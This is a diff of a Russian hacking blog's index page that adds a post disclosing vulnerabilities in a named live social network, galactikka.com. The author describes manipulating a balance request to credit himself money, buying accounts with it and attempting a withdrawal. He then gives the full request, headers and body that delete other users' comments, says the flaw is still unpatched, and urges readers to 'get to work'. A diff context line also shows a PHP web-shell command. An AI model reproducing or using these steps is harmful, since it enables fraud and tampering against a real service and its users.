@@ -9,8 +9,8 @@
   <meta name="author" content="foozzi">
 
   
-  <meta name="description" content="Предыстория Когда то наткнулся на пост кробера о листинге файлов через default.php
-(http://krober.biz/?p=2451) и недавно понял, что подобных &hellip;">
+  <meta name="description" content="Есть некая соц. сеть galactikka.com, которая работает довольно давно, а так же имеет
+ряд уязвимостей, за которые разработчикам должно быть стыдно :) &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +66,120 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/07/02/galaktika-baghov/">Галактика багов</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2017-07-02T14:18:41+00:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2017</span></span> <span class='time'>2:18 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Есть некая соц. сеть <strong>galactikka.com</strong>, которая работает довольно давно, а так же имеет
+ряд уязвимостей, за которые разработчикам должно быть стыдно :)</p>
+
+<p>Решил за них выполнить работу, естественно бесплатно, так как данный сервис отказался
+выплатить хоть какое либо вознаграждение, даже грубить стали ;)
+<img src="https://i.imgur.com/mNZmZNil.png" alt="enter image description here" />
+Я понимаю, сервис копейки приносит, не будем бедных грабить.</p>
+
+<p>Первое что я нашел после 15 минут пребывания на данном сервисе, это тот факт, что при
+отправке ajax запроса на просмотр баланса (при переходе на страницу вывода, осуществляается
+данный запрос), можно было поставить сумму например <strong>-100000</strong> и получить <strong>100000</strong> р. на
+сервисе, соотсветсвенно я купил парочку ненужных премиум аккаунтов, что бы удостовериться в
+том, что деньги реально есть на счету, а так же поставил на вывод, если не ошибаюсь <strong>500</strong>
+р. на <strong>wmr</strong> кошелек, после 3х суток ожидания денег, решил написать, что якобы я вывел
+деньги, но они не дошли и в чем собственно дело, на что получить ответ - &ldquo;<strong>ждите</strong>&rdquo;, а еще
+после суток пришел ответ, что я негодяй и воспользовался дырок, что бы заполучить 500 р. xD</p>
+
+<p>Признавать тот факт что кодеров нужно уволить - отказались. Написал им так же что есть еще
+ряд дыр, которые я могу слить за отдельное финансирование, но как я уже писал выше, ответ
+был категоричен :)</p>
+
+<h2>Нет проверки овнера комментария при удалении</h2>
+
+<p>И так, первая дыра (<strong>на 02.07.2017 актуальна</strong>). Например у нас есть пост оф. команды
+проекта
+<img src="https://i.imgur.com/PvgFULZl.png" alt="enter image description here" /></p>
+
+<p>Для начала узнаем <strong>id</strong> комментария:
+<img src="https://imgur.com/diaKNozl.png" alt="enter image description here" /></p>
+
+<p>Получили: <strong>59578449bd047002458b456d</strong></p>
+
+<p>Теперь все, что осталось сделать, это отправить <strong>xhr</strong> на удаление комментария:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST https://galactikka.com/post/delete-comment</span></code></pre></td></tr></table></div></figure>
+
+
+<p>с хедерами:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Host: galactikka.com
+</span><span class='line'>User-Agent: {крутой ua}
+</span><span class='line'>Accept: application/json, text/plain, */*
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate, br
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+</span><span class='line'>X-Requested-With: XMLHttpRequest
+</span><span class='line'>Referer: https://galactikka.com/news-59576cc5bd0470030d8b4567
+</span><span class='line'>Content-Length: 68
+</span><span class='line'>Cookie: PHPSESSID={сессия}; localTimezoneOffset=0
+</span><span class='line'>Connection: keep-alive</span></code></pre></td></tr></table></div></figure>
+
+
+<p>и телом:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>post_id=59576cc5bd0470030d8b4567&comment_id=5958fa73bd0470957e8b456a</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Где <strong>comment_id</strong> полученый id.</p>
+
+<p>В ответ придет json с содержимым:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>error    "0"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Чужой коммент удален ;)</p>
+
+<h2>Многочисленный sql-error</h2>
+
+<p>Существуют многочисленные потенциально опасные sql ошибки, которые, на удивление даже
+обрабатываются эксепшенами.</p>
+
+<p>Работайте.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1076,6 +1190,10 @@ echo shell_exec($_GET['cmd']);
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/07/02/galaktika-baghov/">Галактика багов</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2017/07/01/iskhodnyi-kod-default-dot-php-v-hostinger-podobnykh-khostinghakh/">Исходный код default.php в Hostinger-подобных хостингах</a>
